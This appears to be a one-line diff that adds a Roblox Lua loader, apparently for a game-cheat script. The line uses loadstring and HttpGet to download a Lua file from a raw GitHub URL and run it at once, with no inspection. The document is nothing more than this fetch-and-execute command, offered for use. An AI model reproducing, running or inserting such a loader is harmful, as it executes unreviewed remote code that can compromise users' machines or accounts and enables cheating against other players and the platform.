@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/partsoapmakerremain/loaders/main/loaders/upd-forsaken-spam1-s55jhyipjc63j0.lua"))()
